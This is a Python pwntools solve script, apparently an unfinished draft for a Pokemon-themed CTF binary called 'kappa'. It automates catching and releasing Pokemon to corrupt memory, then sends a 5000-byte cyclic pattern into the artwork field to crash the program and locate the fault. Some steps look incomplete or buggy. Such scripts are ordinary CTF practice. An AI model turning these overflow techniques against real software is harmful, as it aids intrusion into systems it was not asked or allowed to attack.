#!/usr/bin/env python3

"""
WhatTheFuzz's submission for the <CTF> challenge <name>.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *
from enum import IntEnum, Enum
import platform
import os

exe = ELF("./kappa_patched")
hook = ELF("./hook.so")

context.binary = exe
context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']
context.delete_corefiles = True

HEADER = '''
Choose an Option:
1. Go into the Grass
2. Heal your Pokemon
3. Inpect your Pokemon
4. Release a Pokemon
5. Change Pokemon artwork

'''

BATTLE_HEADER = '''
Choose an Option:
1. Attack
2. Throw Pokeball
3. Run

'''

class Choice(IntEnum):
    '''Enum for the commands.
    '''
    GO_INTO_GRASS = 1
    HEAL_POKEMON = 2
    INSPECT_POKEMON = 3
    RELEASE_POKEMON = 4
    CHANGE_POKEMON_ARTWORK = 5

class Battle(IntEnum):
    '''Enum for the battle commands.
    '''
    ATTACK = 1
    THROW_POKEBALL = 2
    RUN = 3

class Pokemon(Enum):
    KAKUNA = 'Kakuna'
    CHARIZARD = 'Charizard'

class Party(IntEnum):
    '''Enum for the party.
    '''
    FIRST = 1
    SECOND = 2
    THIRD = 3
    FOURTH = 4

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('addr', 4141)

    else:
        # LD_PRELOAD to prevent `sleep` from being called.
        # I couldn't get the hook to link properly on my arm64 Mac, hence the check.
        if platform.processor() == 'i386':
            env = {'LD_PRELOAD': hook.path}
        else:
            env = {''}
        io = process([exe.path], env)

    return io

def name_pokemon(io, name):
    '''Name a Pokemon.
    '''
    io.sendlineafter(b'What would you like to name this Pokemon?', name)

def catch_pokemon(io, pokemon):
    '''Catch a Kakuna.
    '''
    # Walk into the grass until we find a Kakuna.
    choose_an_option(io, Choice.GO_INTO_GRASS)
    line = io.recvuntil((b'appears!',
                          b'You failed to find any Pokemon!'))

    # If we found that pokemon, catch it.
    if f'A wild {pokemon.value} appears!'.encode() in line:

        # The pokemon is a Kakuna, we can just catch it.
        if pokemon is Pokemon.KAKUNA:
            choose_an_option(io, Battle.THROW_POKEBALL)
            name_pokemon(io, 'Danny Devito')

        # If the pokemon is a Charizard, we have to weaken it first.
        elif pokemon is Pokemon.CHARIZARD:
            # Attacking it four times seems to always work.
            for i in range(0, 4):
                choose_an_option(io, Battle.ATTACK)
            # Catch it
            choose_an_option(io, Battle.THROW_POKEBALL)
            name_pokemon(io, 'Charlie Kelly')
        else:
            raise ValueError('Unknown Pokemon encountered.')

    # If we failed to find a pokemon, try again into the grass again.
    elif b'You failed to find any Pokemon!' in line:
        catch_pokemon(io, pokemon)

    # We found a pokemon, but not the one we want. Run!
    else:
        choose_an_option(io, Battle.RUN)
        catch_pokemon(io, pokemon)


def choose_an_option(io, command):
    '''Send a command.
    '''
    # Clean the tube; remove all buffered data.
    # This prevents scenarios where the program has sent the data before we've
    # recv'ed everything and that prevents the program from progressing.
    io.clean()
    io.sendline(str(command.value).encode())

def inspect_core(io):
    '''Inspect the core.
    '''
    try:
        core = io.corefile
        log.info(f'The faulting address is {hex(core.fault_addr)}')

        # Delete the core file.
        #os.remove(core.path)
    except:
        log.error('Failed to open core.')

def main():
    '''Return the flag.
    '''

    with conn() as io:

        # Catch four Kakunas (we can only have five Pokemon).
        for i in range(0, 4):
            catch_pokemon(io, Pokemon.KAKUNA)

        # Catch a Charizard.
        catch_pokemon(io, Pokemon.CHARIZARD)

        # Remove the third Pokemon from our party. I am not sure if the order is
        # important yet, but I have observed the segfault when we release the
        # third Pokemon. This will now be a Charizard.
        choose_an_option(io, Party.THIRD)


        # Change its artwork.
        choose_an_option(io, Choice.CHANGE_POKEMON_ARTWORK)

        # Choose the third pokemon (which is now a Charizard).
        choose_an_option(io, Party.THIRD)

        # It will accept up to ~4k bytes, so let's make a cyclic pattern that large.
        io.sendline(cyclic(5000))
        io.recvline()

        # # Inspect our Pokemon. This should trigger the segfault.
        # # For some reason I am currently unsure of, just sending one command
        # # doesn't work. It seems to only work when they are grouped together
        # # on the same line, at least two are needed. This sends '33'.
        io.sendline(str(Choice.INSPECT_POKEMON.value) * 1)
        # #io.close()
        # io.recvline()
        io.interactive()

        # Inspect the core.
        #inspect_core(io)


if __name__ == '__main__':
    main()
